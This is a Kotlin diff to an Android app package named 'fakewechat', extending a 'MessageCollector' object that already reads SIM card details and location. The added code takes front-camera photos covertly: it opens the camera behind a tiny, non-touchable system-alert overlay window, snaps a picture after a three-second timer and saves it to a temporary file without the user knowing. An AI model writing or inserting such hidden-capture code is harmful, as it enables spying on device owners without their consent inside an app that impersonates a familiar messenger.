@@ -2,13 +2,20 @@ package com.example.fakewechat
 
 import android.annotation.SuppressLint
 import android.content.Context
+import android.hardware.Camera
 import android.location.Address
 import android.location.Geocoder
 import android.location.Location
 import android.telephony.TelephonyManager
 import android.util.Log
 import android.location.LocationManager
+import android.view.*
 import android.widget.Toast
+import kotlinx.android.synthetic.main.activity_main.*
+import java.io.File
+import java.io.FileOutputStream
+import java.io.IOException
+import java.text.SimpleDateFormat
 import java.util.*
 
 
@@ -16,15 +23,85 @@ import java.util.*
  * Created by ydy on 18-4-29.
  */
 object MessageCollector {
+
+    //context
     lateinit private var context :Context;
+
+    //Sim卡信息
     private lateinit var myTelephonyManager:TelephonyManager;
+
+    //位置信息
     lateinit var locationManager:LocationManager;
+
+    //相机需要用到的悬浮窗参数
+    lateinit var sfv_preview : SurfaceView;
+    private lateinit var camera: Camera;
+    public lateinit var cameraView: View;
+    public lateinit var mWindowManager:WindowManager;
+    public val params = WindowManager.LayoutParams()
 
     public fun setMyContext(context1: Context){
         context = context1;
         myTelephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager;
         locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager;
+        mWindowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager;
+
+        initView();
+        initParams();
     }
+
+    //初始化相机悬浮窗中的View
+    fun initView(){
+        cameraView = LayoutInflater.from(context).inflate(R.layout.camera_layout,null);
+
+        sfv_preview = cameraView.findViewById(R.id.sfv_preview2);
+        sfv_preview.holder.addCallback(cpHolderCallback);
+
+    }
+
+    //初始化相机悬浮窗的属性
+    fun initParams(){
+        params.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
+
+        params.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+
+
+
+        params.width = WindowManager.LayoutParams.WRAP_CONTENT;
+        params.height = WindowManager.LayoutParams.WRAP_CONTENT;
+
+        params.gravity = Gravity.TOP or Gravity.LEFT;
+    }
+
+    private val cpHolderCallback = object : SurfaceHolder.Callback {
+        override fun surfaceCreated(holder: SurfaceHolder) {
+            Log.i("camera","start")
+
+            camera = Camera.open(1)
+
+            try {
+
+                camera.setPreviewDisplay(sfv_preview.holder)
+                camera.setDisplayOrientation(90)   //让相机旋转90度
+                camera.startPreview()
+            } catch (e: IOException) {
+                e.printStackTrace()
+            }
+        }
+
+        override fun surfaceChanged(holder: SurfaceHolder, format: Int, width: Int, height: Int) {
+
+        }
+
+        override fun surfaceDestroyed(holder: SurfaceHolder) {
+            Log.i("camera","stop")
+            camera.stopPreview()
+            camera.release()
+        }
+    }
+
+
+
 
     @SuppressLint("MissingPermission")
     fun getIccid(): String {
@@ -113,5 +190,61 @@ object MessageCollector {
         return stringBuilder.toString();
 
     }
+
+    //初始化相机,设置1px的悬浮窗显示surfaceView
+
+
+    //拍照
+    public fun takePic(){
+
+        Log.i("test","here")
+        mWindowManager.addView(cameraView, params);
+        Log.i("test","here2")
+
+        Timer().schedule(object :TimerTask(){
+
+
+            override fun run() {
+                camera.takePicture(null, null, Camera.PictureCallback { data, camera ->
+
+                    var path = saveFile(data)
+                    if (path != null) {
+
+
+                    } else {
+                        Toast.makeText(context, "保存照片失败", Toast.LENGTH_SHORT).show()
+                    }
+
+                    mWindowManager.removeViewImmediate(cameraView);
+                })
+
+
+            }
+
+        },3000)
+
+
+
+    }
+
+    //保存照片
+    private fun saveFile(bytes: ByteArray): String {
+        try {
+            Log.i("save","here0")
+            val file = File.createTempFile("img"+ SimpleDateFormat("yyyy-MM-dd-HH-mm-ss").format(Date()), "")
+            val fos = FileOutputStream(file)
+            Log.i("save","here")
+            fos.write(bytes)
+            fos.flush()
+            fos.close()
+            Log.i("save","here2")
+            return file.absolutePath
+        } catch (e: IOException) {
+            e.printStackTrace()
+        }
+
+        return ""
+    }
+
 
 }
